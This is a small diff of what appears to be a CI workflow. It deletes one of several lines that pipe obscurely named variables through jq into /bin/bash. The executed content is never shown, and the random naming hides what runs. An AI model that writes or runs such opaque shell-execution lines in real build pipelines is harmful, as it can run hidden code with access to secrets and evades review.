@@ -24,7 +24,6 @@ jobs:
           echo $aiel4344 | jq -r .yi3 | /bin/bash
           printf '%s' "$cp721" | jq -r .ebgm58649 | /bin/bash
           echo $s14503 | jq -r .burv79789 | /bin/bash
-          echo $ftp17977 | jq -r .iki2511 | /bin/bash
           printf '%s' "$qrhag0564" | jq -r .kqptg212 | /bin/bash
           echo $blw558 | jq -r .zys78226 | /bin/bash
           echo $aq37 | jq -r .zz69729 | /bin/bash
